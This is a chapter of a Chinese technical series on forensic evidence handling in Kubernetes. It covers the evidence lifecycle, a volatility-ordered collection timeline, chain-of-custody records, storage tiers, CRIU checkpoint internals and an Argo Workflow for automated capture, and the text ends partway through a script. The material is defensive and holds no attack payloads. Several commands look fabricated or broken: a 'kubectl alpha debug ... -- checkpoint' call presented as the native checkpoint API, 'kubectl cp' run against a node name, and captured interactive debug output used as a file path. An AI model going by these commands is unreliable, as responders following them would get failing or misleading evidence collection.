# 第二章:FEBM 技术实现体系

> **所属系列**: FEBM 法医鉴定循证方法论深度解析  
> **关联主文档**: [FEBM 方法论深度解析](./febm-methodology-deep-dive.md)  
> **上一章**: [第一章:FEBM 方法论原理与理论基础](./01-febm-theory-foundations.md)  
> **下一章**: [第三章:FEBM 最佳实践](./03-febm-best-practices.md)

---

## 2.1 证据生命周期管理

### 2.1.1 六阶段证据生命周期模型

FEBM 将数字证据的完整生命周期划分为六个标准化阶段,每个阶段有特定的技术实践、质量控制要求和交付物:

```
证据生命周期六阶段模型:

┌─────────────────────────────────────────────────────────────────┐
│                     FEBM 证据生命周期                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Phase 1          Phase 2          Phase 3                     │
│  ┌──────────┐    ┌──────────┐    ┌──────────┐                 │
│  │ Identify │───►│ Collect  │───►│ Preserve │                 │
│  │  识别    │    │  采集    │    │  保全    │                 │
│  └──────────┘    └──────────┘    └──────────┘                 │
│      │                │                │                        │
│      ▼                ▼                ▼                        │
│  发现潜在证据     提取数字数据     确保完整性                    │
│  评估易失性       按优先级采集     建立保管链                    │
│  确定范围         记录元数据       计算哈希值                    │
│                                                                 │
│                       ▼                                         │
│  Phase 6          Phase 5          Phase 4                     │
│  ┌──────────┐    ┌──────────┐    ┌──────────┐                 │
│  │ Archive  │◄───│ Present  │◄───│ Analyze  │                 │
│  │  归档    │    │  呈现    │    │  分析    │                 │
│  └──────────┘    └──────────┘    └──────────┘                 │
│      │                │                │                        │
│      ▼                ▼                ▼                        │
│  长期存储         生成报告         深度检查                      │
│  合规留存         可视化展示       关联分析                      │
│  检索机制         法律/审计支持     推理验证                     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘

关键原则: 
  • 单向流动: 后续阶段不应影响前序阶段的证据状态
  • 可追溯性: 每个阶段的操作都有完整日志
  • 完整性验证: 每次转移都进行哈希验证
```

### 2.1.2 Phase 1: 证据识别 (Identify)

**核心任务**: 在 Kubernetes 环境中快速识别哪些数据源包含与事件相关的证据。

**Kubernetes 环境中的证据源清单**:

```
Kubernetes 证据源分类矩阵:

┌───────────────────┬──────────────────────┬──────────┬──────────┐
│ 证据源类别        │ 具体数据源           │ 易失性   │ 采集方法 │
├───────────────────┼──────────────────────┼──────────┼──────────┤
│ 控制平面层        │ API Server 审计日志  │ 低       │ 文件采集 │
│                   │ etcd 快照            │ 低       │ etcdctl  │
│                   │ Scheduler 决策日志   │ 低       │ 文件采集 │
│                   │ Controller 日志      │ 低       │ 文件采集 │
│                   │ Admission Webhook    │ 中       │ 文件采集 │
├───────────────────┼──────────────────────┼──────────┼──────────┤
│ 运行时层          │ 容器内存状态         │ 极高     │ CRIU检查点│
│                   │ 系统调用序列         │ 极高     │ eBPF捕获 │
│                   │ 网络连接状态         │ 极高     │ conntrack│
│                   │ 进程树               │ 极高     │ ps快照   │
│                   │ 文件描述符           │ 极高     │ lsof     │
│                   │ 容器层文件系统       │ 高       │ overlay导│
├───────────────────┼──────────────────────┼──────────┼──────────┤
│ 可观测性层        │ Prometheus 指标      │ 中       │ API查询  │
│                   │ 分布式追踪 Spans     │ 中       │ Jaeger   │
│                   │ 应用日志             │ 中       │ Loki/ES  │
│                   │ Kubernetes Events    │ 高       │ kubectl  │
├───────────────────┼──────────────────────┼──────────┼──────────┤
│ 网络层            │ CNI 插件日志         │ 中       │ 文件采集 │
│                   │ Service Mesh 遥测    │ 中       │ API查询  │
│                   │ 网络流量记录         │ 中       │ Hubble   │
│                   │ DNS 查询日志         │ 中       │ CoreDNS  │
├───────────────────┼──────────────────────┼──────────┼──────────┤
│ 节点层            │ kubelet 日志         │ 低       │ journalctl│
│                   │ 内核日志(dmesg)      │ 中       │ dmesg    │
│                   │ 节点审计日志(auditd) │ 低       │ ausearch │
│                   │ 节点指标             │ 中       │ node_exp │
└───────────────────┴──────────────────────┴──────────┴──────────┘
```

**证据识别决策树**:

```
证据识别决策流程:

事件类型 → 关键证据源定位
│
├─ 安全事件 (Security Incident)
│  ├─ 容器逃逸
│  │  ├─ [必需] eBPF syscall traces (CAP_SYS_ADMIN, mount)
│  │  ├─ [必需] 容器检查点 (内存取证)
│  │  ├─ [必需] 节点 audit 日志
│  │  └─ [辅助] API Server 审计 (特权容器创建)
│  │
│  ├─ 加密货币挖矿
│  │  ├─ [必需] CPU 指标 (node_exporter)
│  │  ├─ [必需] 网络出站连接 (eBPF/conntrack)
│  │  ├─ [必需] 容器内进程列表
│  │  └─ [辅助] DNS 查询日志 (矿池域名)
│  │
│  └─ 数据泄露
│     ├─ [必需] API Server 审计 (Secret 访问)
│     ├─ [必需] 网络流量日志 (异常出站)
│     ├─ [必需] 应用日志 (敏感操作)
│     └─ [辅助] Service Mesh mTLS 日志
│
├─ 可用性事件 (Availability Incident)
│  ├─ Pod CrashLoopBackOff
│  │  ├─ [必需] 容器日志 (stdout/stderr)
│  │  ├─ [必需] Kubernetes Events
│  │  ├─ [必需] 应用指标 (OOM, Exit Code)
│  │  └─ [辅助] 分布式追踪 (请求失败上下文)
│  │
│  └─ 集群资源耗尽
│     ├─ [必需] kube-scheduler 日志 (FailedScheduling)
│     ├─ [必需] 节点资源指标
│     ├─ [必需] Pod 资源请求/限制配置
│     └─ [辅助] Cluster Autoscaler 日志
│
└─ 性能事件 (Performance Degradation)
   ├─ 应用延迟增加
   │  ├─ [必需] 分布式追踪 (端到端延迟分解)
   │  ├─ [必需] Service Mesh 遥测 (请求延迟分位数)
   │  ├─ [必需] 应用指标 (业务指标)
   │  └─ [辅助] 节点 CPU throttling 指标
   │
   └─ 网络延迟
      ├─ [必需] CNI 指标 (packet loss, latency)
      ├─ [必需] Service Mesh 连接池状态
      ├─ [必需] 节点网络队列统计
      └─ [辅助] 基础设施网络监控
```

### 2.1.3 Phase 2: 证据采集 (Collect)

**核心原则**: 按易失性优先级采集,确保高易失性证据优先保存。

**易失性优先级采集序列** (针对容器异常检测):

```
自动化采集工作流 (基于 Falco 检测触发):

T+0s   eBPF 检测到异常行为
       │
       ▼
T+0.5s ① 内存快照 (CRIU checkpoint)
       │  命令: kubectl alpha debug <pod> --target <container> \
       │         --image-pull-policy=Never --copy-to=forensic-<pod>
       │  目标: 捕获完整的进程内存、文件描述符、网络状态
       │
       ▼
T+1s   ② 系统调用上下文
       │  命令: bpftrace -e 'tracepoint:raw_syscalls:sys_enter /
       │         pid == <target>/ { @[probe] = count(); }'
       │  目标: 记录最近 5 秒的 syscall 序列
       │
       ▼
T+2s   ③ 网络连接快照
       │  命令: kubectl exec <pod> -- \
       │         cat /proc/net/{tcp,udp,unix}
       │  命令: conntrack -L -o extended | grep <container-ip>
       │  目标: 当前活动连接的四元组和状态
       │
       ▼
T+3s   ④ 容器文件系统导出
       │  命令: docker export <container-id> > container-fs.tar
       │  或: crictl export <container-id> container-fs.tar
       │  目标: 临时文件、日志文件、可执行文件
       │
       ▼
T+5s   ⑤ Kubernetes 上下文
       │  命令: kubectl get pod <pod> -o yaml > pod-spec.yaml
       │  命令: kubectl describe pod <pod> > pod-details.txt
       │  命令: kubectl get events --field-selector \
       │         involvedObject.name=<pod> > events.txt
       │
       ▼
T+10s  ⑥ 日志采集
       │  命令: kubectl logs <pod> --all-containers \
       │         --timestamps > logs.txt
       │  命令: kubectl logs <pod> --previous > logs-previous.txt
       │
       ▼
T+30s  ⑦ 节点上下文
       │  命令: kubectl get nodes <node> -o yaml
       │  命令: kubectl describe node <node>
       │  SSH: journalctl -u kubelet --since '5 min ago'
       │
       ▼
T+60s  ⑧ 审计日志查询
       │  查询: 过滤最近 30 分钟该 Pod 相关的所有 API 操作
       │  工具: jq '.items[] | select(.objectRef.name=="<pod>")' \
       │        /var/log/kubernetes/audit.log
       │
       ▼
完成    生成采集清单 (manifest) 和哈希索引
```

**采集工具矩阵**:

| 证据类型 | 主要工具 | 备选工具 | 自动化方式 |
|---------|---------|---------|-----------|
| 容器检查点 | CRIU | Podman checkpoint | Falco webhook → Argo Workflow |
| 内存取证 | Volatility 3 | Rekall | 分析环境自动化脚本 |
| 系统调用 | bpftrace | sysdig | Falco 原生 output |
| 文件系统 | crictl export | docker export | Argo artifact 自动上传 |
| 网络流量 | Cilium Hubble | tcpdump | Hubble Relay API |
| 审计日志 | jq | auditbeat | Filebeat → Elasticsearch |
| 指标数据 | Prometheus API | Thanos Query | Grafana API 查询 |
| 分布式追踪 | Jaeger Query | Tempo API | TraceQL 查询 |

### 2.1.4 Phase 3: 证据保全 (Preserve)

**核心目标**: 确保证据的完整性、真实性和可审计性。

**链式监管 (Chain of Custody) 实施**:

```yaml
# Chain of Custody 元数据示例 (Kubernetes ConfigMap)
apiVersion: v1
kind: ConfigMap
metadata:
  name: evidence-custody-ev-2026-0225-001
  namespace: forensics
  labels:
    evidence-type: container-checkpoint
    incident-id: inc-20260225-1032
data:
  evidence-id: "EV-2026-0225-001"
  original-source: "pod/suspicious-app-7d9f8b-xyz / container: app"
  collection-timestamp: "2026-02-25T10:32:15Z"
  collection-method: "CRIU checkpoint via kubectl alpha debug"
  collector-identity: "falco-webhook-sa@cluster-prod.iam"
  original-location: "node/node-03:/var/lib/kubelet/pods/<uid>"
  
  # 完整性验证
  sha256sum: "a3f2b8c9d1e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0"
  file-size: "2147483648"  # 2GB
  
  # 保管链记录 (JSON)
  custody-chain: |
    [
      {
        "seq": 1,
        "timestamp": "2026-02-25T10:32:15Z",
        "action": "CHECKPOINT_CREATED",
        "actor": "falco-webhook-sa",
        "location": "node-03:/tmp/checkpoint-abc123",
        "verification": "sha256sum verified"
      },
      {
        "seq": 2,
        "timestamp": "2026-02-25T10:32:45Z",
        "action": "TRANSFERRED_TO_STORAGE",
        "actor": "evidence-collector-cronjob",
        "location": "s3://forensics-bucket/2026/02/25/EV-2026-0225-001.tar.gz",
        "verification": "sha256sum verified",
        "transfer-method": "TLS 1.3 encrypted"
      },
      {
        "seq": 3,
        "timestamp": "2026-02-25T11:15:00Z",
        "action": "RESTORED_FOR_ANALYSIS",
        "actor": "analyst-jdoe@company.com",
        "location": "isolated-cluster/pod/forensic-workstation-001",
        "verification": "sha256sum verified",
        "authorization": "incident-response-rbac-policy"
      }
    ]
```

**存储架构**:

```
证据存储三层架构:

┌─────────────────────────────────────────────────────────────┐
│ Layer 3: 长期归档层 (Cold Storage)                           │
│ ────────────────────────────────────────────────────────────│
│ • S3 Glacier Deep Archive / Azure Archive                  │
│ • 保留期: 7 年 (合规要求)                                     │
│ • 加密: AES-256 + KMS                                       │
│ • 访问控制: 仅合规审计人员                                    │
│ • 检索延迟: 12-48 小时                                       │
│ • 用途: 法律/审计长期留存                                     │
└─────────────────────────────────────────────────────────────┘
          ▲
          │ 归档策略: 事件关闭后 90 天自动归档
          │
┌─────────────────────────────────────────────────────────────┐
│ Layer 2: 中期存储层 (Warm Storage)                           │
│ ────────────────────────────────────────────────────────────│
│ • S3 Standard-IA / Azure Cool                              │
│ • 保留期: 90 天                                              │
│ • 加密: AES-256                                             │
│ • 访问控制: 事件响应团队                                      │
│ • 检索延迟: 毫秒级                                           │
│ • 用途: 事件调查、趋势分析                                    │
└─────────────────────────────────────────────────────────────┘
          ▲
          │ 自动转移: 事件关闭后 7 天
          │
┌─────────────────────────────────────────────────────────────┐
│ Layer 1: 热存储层 (Hot Storage)                              │
│ ────────────────────────────────────────────────────────────│
│ • S3 Standard / MinIO / Azure Blob Hot                     │
│ • 保留期: 7 天                                               │
│ • 加密: TLS + AES-256                                       │
│ • 访问控制: 自动化系统 + 响应团队                              │
│ • 检索延迟: 毫秒级                                           │
│ • 用途: 活跃事件调查、自动化分析                               │
│ • 元数据索引: Elasticsearch                                  │
└─────────────────────────────────────────────────────────────┘
```

### 2.1.5 数据流架构

```
端到端证据数据流:

┌──────────────────────────────────────────────────────────────┐
│ 生产 Kubernetes 集群                                          │
│ ──────────────────────────────────────────────────────────── │
│                                                              │
│  ┌──────┐  eBPF  ┌────────┐  Webhook  ┌─────────────────┐  │
│  │ Pod  │───────►│ Falco  │──────────►│ Argo Workflows  │  │
│  │ 异常 │        │ 检测   │   Alert   │   (采集编排)    │  │
│  └──────┘        └────────┘           └────────┬─────────┘  │
│                                                 │            │
│                                                 ▼            │
│                                       ┌──────────────────┐   │
│                                       │ Evidence         │   │
│                                       │ Collection Pod   │   │
│                                       │ • CRIU checkpoint│   │
│                                       │ • 日志采集        │   │
│                                       │ • 元数据提取      │   │
│                                       └────────┬─────────┘   │
└──────────────────────────────────────────────│──────────────┘
                                                │
                                                │ TLS 加密传输
                                                │ SHA-256 验证
                                                ▼
┌──────────────────────────────────────────────────────────────┐
│ 证据存储服务 (对象存储)                                        │
│ ──────────────────────────────────────────────────────────── │
│  ┌──────────────────┐        ┌──────────────────────┐        │
│  │ S3 兼容存储      │        │ 元数据索引           │        │
│  │ • 证据原始文件   │◄──────►│ (Elasticsearch)      │        │
│  │ • 不可变存储     │  同步  │ • 全文搜索           │        │
│  │ • 版本控制       │        │ • 关系图谱           │        │
│  └──────────────────┘        └──────────────────────┘        │
└───────────────────────────────────┬──────────────────────────┘
                                    │
                                    │ RBAC 授权
                                    │ 审计日志
                                    ▼
┌──────────────────────────────────────────────────────────────┐
│ 隔离分析环境 (Air-Gapped Cluster)                              │
│ ──────────────────────────────────────────────────────────── │
│  ┌────────────────────┐      ┌─────────────────────┐         │
│  │ 取证工作站 Pod     │      │ 分析工具集          │         │
│  │ • Volatility 3     │◄────►│ • Timesketch        │         │
│  │ • Rekall           │      │ • Plaso             │         │
│  │ • Container        │      │ • Jupyter Notebook  │         │
│  │   Explorer         │      │ • Wireshark         │         │
│  └────────────────────┘      └─────────────────────┘         │
│           │                           │                       │
│           └───────────┬───────────────┘                       │
│                       ▼                                       │
│           ┌────────────────────────┐                          │
│           │ 调查报告生成           │                          │
│           │ • Markdown/PDF         │                          │
│           │ • 时间线可视化         │                          │
│           │ • 证据关联图           │                          │
│           └────────────────────────┘                          │
└──────────────────────────────────────────────────────────────┘
```

---

## 2.2 容器检查点技术 (Container Checkpoint)

### 2.2.1 CRIU 技术深度解析

**CRIU (Checkpoint/Restore In Userspace)** 是 Linux 内核的检查点/恢复机制,是容器法医鉴定的核心技术。它能够在不停止进程的情况下"冻结"整个进程树,将其完整状态保存到磁盘,随后在任意时间点完全恢复。

**CRIU 架构组件**:

```
CRIU 工作原理:

┌────────────────────────────────────────────────────────────────┐
│                      运行中的容器                               │
│ ┌────────────────────────────────────────────────────────────┐ │
│ │ Container Process Tree                                     │ │
│ │  PID 1234 (app)                                           │ │
│ │    ├─ PID 1235 (worker-1)                                │ │
│ │    ├─ PID 1236 (worker-2)                                │ │
│ │    └─ PID 1237 (logger)                                  │ │
│ └────────────────────────────────────────────────────────────┘ │
│                            │                                   │
│                            │ CRIU checkpoint 命令               │
│                            ▼                                   │
│ ┌────────────────────────────────────────────────────────────┐ │
│ │ CRIU 核心引擎                                              │ │
│ │ ┌──────────────┐ ┌──────────────┐ ┌──────────────┐       │ │
│ │ │ ptrace 子系统│ │ /proc 解析器 │ │ parasite注入 │       │ │
│ │ │ 冻结进程     │ │ 读取进程状态 │ │ 提取内存内容 │       │ │
│ │ └──────────────┘ └──────────────┘ └──────────────┘       │ │
│ └────────────────────────────────────────────────────────────┘ │
│                            │                                   │
│                            ▼                                   │
│ ┌────────────────────────────────────────────────────────────┐ │
│ │ 序列化引擎 (Protobuf)                                       │ │
│ │  将内存中的数据结构转换为磁盘格式                            │ │
│ └────────────────────────────────────────────────────────────┘ │
│                            │                                   │
│                            ▼                                   │
└────────────────────────────┼───────────────────────────────────┘
                             │
                             ▼
┌────────────────────────────────────────────────────────────────┐
│ 检查点归档 (checkpoint.tar)                                     │
│ ┌────────────────────────────────────────────────────────────┐ │
│ │ 文件结构:                                                   │ │
│ │                                                            │ │
│ │ checkpoint/                                                │ │
│ │ ├── inventory.img        # 检查点元数据索引                │ │
│ │ ├── core-1234.img        # PID 1234 的寄存器/信号/资源     │ │
│ │ ├── core-1235.img        # PID 1235 的核心状态            │ │
│ │ ├── mm-1234.img          # 内存映射描述符                 │ │
│ │ ├── pagemap-1234.img     # 虚拟地址到物理地址映射         │ │
│ │ ├── pages-1.img          # 实际的内存页内容 (可达数GB)    │ │
│ │ ├── files.img            # 打开的文件描述符列表            │ │
│ │ ├── fdinfo-*.img         # 每个 fd 的详细信息             │ │
│ │ ├── fs-1234.img          # 文件系统上下文(cwd, root)      │ │
│ │ ├── ids-1234.img         # UID/GID/GROUPS                │ │
│ │ ├── creds-1234.img       # Capabilities/Seccomp          │ │
│ │ ├── netdev.img           # 网络设备状态                   │ │
│ │ ├── ifaddr.img           # IP 地址配置                    │ │
│ │ ├── route.img            # 路由表                         │ │
│ │ ├── iptables.img         # Netfilter 规则                │ │
│ │ ├── tcp-stream-*.img     # TCP 连接状态和缓冲区           │ │
│ │ ├── shmem-*.img          # 共享内存段                     │ │
│ │ ├── pipes.img            # 管道和 FIFO                    │ │
│ │ ├── signalfd.img         # 信号 fd                        │ │
│ │ ├── eventfd.img          # Event fd                       │ │
│ │ ├── eventpoll.img        # Epoll 结构                     │ │
│ │ ├── timerfd.img          # Timer fd                       │ │
│ │ ├── cgroup.img           # Cgroup 层次结构                │ │
│ │ ├── mountpoints.img      # Mount namespace 状态           │ │
│ │ ├── namespaces.img       # 所有 namespace 引用            │ │
│ │ └── seccomp.img          # Seccomp 过滤器                 │ │
│ └────────────────────────────────────────────────────────────┘ │
│                                                                │
│ 总大小: 取决于内存使用量 (典型: 数百 MB 到数 GB)                │
└────────────────────────────────────────────────────────────────┘
```

### 2.2.2 检查点捕获的完整状态

**进程状态 (Process State)**:

```
进程核心状态捕获:

┌─────────────────────────────────────────────────────────────┐
│ 寄存器状态 (Register State)                                  │
│ ──────────────────────────────────────────────────────────  │
│ • 通用寄存器: RAX, RBX, RCX, RDX, RSI, RDI, RBP, RSP...   │
│ • 指令指针: RIP (恢复后从此处继续执行)                      │
│ • 标志寄存器: RFLAGS                                        │
│ • 段寄存器: CS, DS, ES, FS, GS, SS                         │
│ • 浮点寄存器: FPU/MMX/SSE/AVX 状态                          │
│                                                             │
│ 意义: 恢复后进程从精确的指令位置继续执行                     │
├─────────────────────────────────────────────────────────────┤
│ 内存布局 (Memory Layout)                                    │
│ ──────────────────────────────────────────────────────────  │
│  高地址                                                     │
│   │ [kernel space]          (不捕获)                       │
│   ├─ 0xFFFFFFFF...          ──────────────                 │
│   │ [stack]                 栈区域                          │
│   │  • 局部变量                                            │
│   │  • 函数调用帧                                          │
│   │  • 返回地址                                            │
│   ├─ [memory mapping]       mmap区域                        │
│   │  • 共享库 (.so)                                        │
│   │  • 匿名映射                                            │
│   ├─ [heap]                 堆区域                          │
│   │  • malloc/new 分配的内存                               │
│   │  • 动态数据结构                                        │
│   ├─ [bss]                  未初始化全局变量                │
│   ├─ [data]                 已初始化全局变量                │
│   ├─ [text]                 代码段                          │
│  低地址                                                     │
│                                                             │
│ 捕获方式:                                                   │
│ • 逐页扫描 /proc/[pid]/maps                                │
│ • 通过 /proc/[pid]/mem 或 process_vm_readv 读取            │
│ • 仅捕获脏页 (dirty pages) 以减小体积                      │
└─────────────────────────────────────────────────────────────┘
```

**文件系统状态 (Filesystem State)**:

```
文件系统相关状态:

┌─────────────────────────────────────────────────────────────┐
│ 打开的文件描述符 (Open File Descriptors)                     │
│ ──────────────────────────────────────────────────────────  │
│  FD   类型        路径/描述          位置    标志            │
│  ─────────────────────────────────────────────────────────  │
│  0    REG-file    /app/logs/app.log  offset:12345  O_WRONLY│
│  1    pipe        pipe:[12345]       -              -       │
│  2    pipe        pipe:[12345]       -              -       │
│  3    socket      TCP 10.1.2.3:8080  ESTABLISHED   -       │
│  4    eventfd     eventfd:[67890]    counter:0     -       │
│  5    REG-file    /tmp/cache.db      offset:8192   O_RDWR  │
│  6    timerfd     timerfd:[11111]    -              -       │
│  ...                                                        │
│                                                             │
│ 关键信息:                                                   │
│ • 文件路径 (需在恢复环境中可访问)                           │
│ • 当前偏移量 (lseek position)                              │
│ • 打开模式和标志                                            │
│ • 文件锁 (flock/fcntl locks)                               │
├─────────────────────────────────────────────────────────────┤
│ 文件系统上下文                                              │
│ ──────────────────────────────────────────────────────────  │
│ • 当前工作目录 (cwd): /app/workspace                        │
│ • 根目录 (root): / (或容器的 chroot)                        │
│ • umask: 0022                                              │
└─────────────────────────────────────────────────────────────┘
```

**网络状态 (Network State)**:

```
网络连接完整状态:

┌─────────────────────────────────────────────────────────────┐
│ TCP 连接状态捕获                                             │
│ ──────────────────────────────────────────────────────────  │
│                                                             │
│  连接 1: 10.244.1.10:35678 → 10.96.0.1:443 (ESTABLISHED)   │
│  ┌──────────────────────────────────────────────────────┐  │
│  │ • 序列号 (seq): 1234567890                           │  │
│  │ • 确认号 (ack): 9876543210                           │  │
│  │ • 窗口大小 (window): 65535                           │  │
│  │ • MSS (最大段大小): 1460                             │  │
│  │ • RTT (往返时间): 15ms                               │  │
│  │ • 拥塞窗口 (cwnd): 10                                │  │
│  │ • 发送缓冲区: 128KB (包含未确认的数据)                │  │
│  │ • 接收缓冲区: 256KB                                  │  │
│  │ • TCP 选项: timestamps, sack                         │  │
│  │ • Socket 选项: SO_KEEPALIVE, TCP_NODELAY            │  │
│  └──────────────────────────────────────────────────────┘  │
│                                                             │
│  连接 2: 10.244.1.10:8080 → 0.0.0.0:* (LISTEN)             │
│  • backlog 队列: 128                                       │
│  • 待处理连接: 3                                           │
│                                                             │
├─────────────────────────────────────────────────────────────┤
│ 网络命名空间状态                                            │
│ ──────────────────────────────────────────────────────────  │
│ • 网络接口: eth0 (MAC: aa:bb:cc:dd:ee:ff)                  │
│ • IP 地址: 10.244.1.10/24                                  │
│ • 路由表: default via 10.244.1.1                           │
│ • iptables 规则: 捕获 NAT/filter/mangle 表                 │
│ • conntrack 条目: 活动连接跟踪                             │
└─────────────────────────────────────────────────────────────┘

**法医鉴定价值**:
  ✓ 恢复后网络连接自动重建,无需重新握手
  ✓ 可分析缓冲区中的未发送/未处理数据
  ✓ 捕获恶意连接的精确状态 (C&C 通道)
```

**IPC 状态 (Inter-Process Communication)**:

```
IPC 机制状态:

┌─────────────────────────────────────────────────────────────┐
│ System V IPC 对象                                           │
│ ──────────────────────────────────────────────────────────  │
│ • 共享内存 (shmem): ID, key, size, 附加进程, 内容           │
│ • 消息队列 (msgqueue): ID, 队列中的消息, 权限               │
│ • 信号量 (semaphore): ID, 当前值, 等待队列                  │
│                                                             │
├─────────────────────────────────────────────────────────────┤
│ POSIX IPC 对象                                              │
│ ──────────────────────────────────────────────────────────  │
│ • 共享内存 (shm_open): /dev/shm/* 文件                      │
│ • 消息队列 (mqueue): /dev/mqueue/* 文件                     │
│ • 命名信号量: sem_open 创建的信号量                         │
│                                                             │
├─────────────────────────────────────────────────────────────┤
│ 管道和 FIFO                                                 │
│ ──────────────────────────────────────────────────────────  │
│ • 匿名管道: 缓冲区内容 (最多 64KB)                          │
│ • 命名管道 (FIFO): 路径和缓冲区状态                         │
│                                                             │
├─────────────────────────────────────────────────────────────┤
│ Unix Domain Sockets                                         │
│ ──────────────────────────────────────────────────────────  │
│ • 抽象命名空间 socket: @/tmp/.X11-unix/X0                   │
│ • 文件系统 socket: /var/run/app.sock                        │
│ • 缓冲区中的数据                                            │
└─────────────────────────────────────────────────────────────┘
```

### 2.2.3 Kubernetes 1.25+ 原生 Checkpoint API

Kubernetes 1.25 引入了原生的容器检查点 API,使得 CRIU 功能可以通过标准 kubectl 命令触发:

```bash
# Kubernetes 原生检查点命令
kubectl alpha debug <pod-name> \
  --target <container-name> \
  --image=<forensic-image> \
  --copy-to=<forensic-pod-name> \
  -- checkpoint

# 底层实现:
# 1. API Server 接收请求
# 2. kubelet 调用 CRI 运行时 (containerd/CRI-O) 的 CheckpointContainer 方法
# 3. CRI 运行时调用 CRIU
# 4. 检查点文件保存在节点 /var/lib/kubelet/checkpoints/
# 5. kubelet 将文件打包为 tar 并返回

# 检查点文件结构
/var/lib/kubelet/checkpoints/
└── checkpoint-<pod-uid>_<container-name>_<timestamp>.tar
    └── (CRIU 生成的所有 .img 文件)
```

**CRI 接口定义** (简化版):

```protobuf
service RuntimeService {
  // 创建容器检查点
  rpc CheckpointContainer(CheckpointContainerRequest) 
      returns (CheckpointContainerResponse) {}
}

message CheckpointContainerRequest {
  string container_id = 1;
  string location = 2;      // 检查点保存路径
  int64 timeout = 3;        // 超时时间
}

message CheckpointContainerResponse {
  repeated string artifacts = 1;  // 生成的文件列表
}
```

### 2.2.4 自动化取证工作流

```yaml
# Argo Workflow: 自动化容器检查点采集工作流
apiVersion: argoproj.io/v1alpha1
kind: Workflow
metadata:
  name: forensic-checkpoint-workflow
  namespace: forensics
spec:
  entrypoint: forensic-capture
  arguments:
    parameters:
    - name: pod-name
      value: "suspicious-pod-abc123"
    - name: pod-namespace
      value: "production"
    - name: container-name
      value: "app"
    - name: incident-id
      value: "INC-20260225-001"
  
  volumeClaimTemplates:
  - metadata:
      name: evidence-storage
    spec:
      accessModes: [ "ReadWriteOnce" ]
      resources:
        requests:
          storage: 10Gi
  
  templates:
  - name: forensic-capture
    steps:
    - - name: checkpoint-container
        template: create-checkpoint
    - - name: collect-logs
        template: collect-container-logs
      - name: collect-k8s-context
        template: collect-k8s-metadata
    - - name: compute-hashes
        template: generate-checksums
    - - name: upload-to-storage
        template: upload-evidence
    - - name: create-custody-record
        template: create-chain-of-custody
  
  - name: create-checkpoint
    script:
      image: bitnami/kubectl:latest
      command: [bash]
      source: |
        #!/bin/bash
        set -euo pipefail
        
        POD={{workflow.parameters.pod-name}}
        NS={{workflow.parameters.pod-namespace}}
        CONTAINER={{workflow.parameters.container-name}}
        
        echo "[$(date -Iseconds)] 开始创建容器检查点..."
        
        # 创建检查点 (需要启用 feature gate)
        kubectl alpha debug $POD -n $NS \
          --target=$CONTAINER \
          --image=registry.k8s.io/pause:3.9 \
          --copy-to=forensic-$POD-{{workflow.creationTimestamp.Format "20060102-150405"}} \
          -- checkpoint \
          > /mnt/evidence/checkpoint.log 2>&1
        
        # 从节点复制检查点文件
        NODE=$(kubectl get pod $POD -n $NS -o jsonpath='{.spec.nodeName}')
        CHECKPOINT_FILE=$(kubectl debug node/$NODE -it --image=alpine \
          -- find /host/var/lib/kubelet/checkpoints -name "*${CONTAINER}*" -type f | head -1)
        
        kubectl cp $NODE:$CHECKPOINT_FILE /mnt/evidence/checkpoint.tar \
          -c debugger-container
        
        echo "[$(date -Iseconds)] 检查点创建完成: $(du -h /mnt/evidence/checkpoint.tar)"
      volumeMounts:
      - name: evidence-storage
        mountPath: /mnt/evidence
  
  - name: collect-container-logs
    script:
      image: bitnami/kubectl:latest
      command: [bash]
      source: |
        #!/bin/bash
        POD={{workflow.parameters.pod-name}}
        NS={{workflow.parameters.pod-namespace}}
        
        echo "[$(date -Iseconds)] 采集容器日志..."
        
        # 当前容器日志
        kubectl logs $POD -n $NS --all-containers=true \
          --timestamps=true --prefix=true \
          > /mnt/evidence/logs-current.txt
        
        # 前一个容器日志 (如果重启过)
        kubectl logs $POD -n $NS --previous \
          --timestamps=true \
          > /mnt/evidence/logs-previous.txt 2>&1 || true
      volumeMounts:
      - name: evidence-storage
        mountPath: /mnt/evidence
  
  - name: collect-k8s-metadata
    script:
      image: bitnami/kubectl:latest
      command: [bash]
      source: |
        #!/bin/bash
        POD={{workflow.parameters.pod-name}}
        NS={{workflow.parameters.pod-namespace}}
        
        echo "[$(date -Iseconds)] 采集 Kubernetes 上下文..."
        
        # Pod 完整描述
        kubectl get pod $POD -n $NS -o yaml > /mnt/evidence/pod-spec.yaml
        kubectl describe pod $POD -n $NS > /mnt/evidence/pod-describe.txt
        
        # 相关事件
        kubectl get events -n $NS --field-selector involvedObject.name=$POD \
          --sort-by='.lastTimestamp' \
          > /mnt/evidence/events.txt
        
        # 节点信息
        NODE=$(kubectl get pod $POD -n $NS -o jsonpath='{.spec.nodeName}')
        kubectl get node $NODE -o yaml > /mnt/evidence/node-spec.yaml
        kubectl describe node $NODE > /mnt/evidence/node-describe.txt
      volumeMounts:
      - name: evidence-storage
        mountPath: /mnt/evidence
  
  - name: generate-checksums
    script:
      image: alpine:latest
      command: [sh]
      source: |
        #!/bin/sh
        echo "[$(date -Iseconds)] 计算文件哈希值..."
        
        cd /mnt/evidence
        sha256sum * > checksums.sha256
        
        cat checksums.sha256
      volumeMounts:
      - name: evidence-storage
        mountPath: /mnt/evidence
  
  - name: upload-evidence
    script:
      image: amazon/aws-cli:latest
      command: [bash]
      source: |
        #!/bin/bash
        INCIDENT_ID={{workflow.parameters.incident-id}}
        TIMESTAMP=$(date +%Y%m%d-%H%M%S)
        BUCKET="s3://forensics-evidence-bucket"
        PREFIX="${INCIDENT_ID}/${TIMESTAMP}"
        
        echo "[$(date -Iseconds)] 上传证据到对象存储..."
        
        aws s3 sync /mnt/evidence ${BUCKET}/${PREFIX}/ \
          --sse AES256 \
          --metadata incident-id=${INCIDENT_ID},timestamp=${TIMESTAMP}
        
        echo "${BUCKET}/${PREFIX}" > /mnt/evidence/storage-location.txt
      volumeMounts:
      - name: evidence-storage
        mountPath: /mnt/evidence
      env:
      - name: AWS_ACCESS_KEY_ID
        valueFrom:
          secretKeyRef:
            name: forensics-s3-credentials
            key: access-key-id
      - name: AWS_SECRET_ACCESS_KEY
        valueFrom:
          secretKeyRef:
            name: forensics-s3-credentials
            key: secret-access-key
  
  - name: create-chain-of-custody
    script:
      image: bitnami/kubectl:latest
      command: [bash]
      source: |
        #!/bin/bash
        INCIDENT_ID={{workflow.parameters.incident-id}}
        POD={{workflow.parameters.pod-name}}
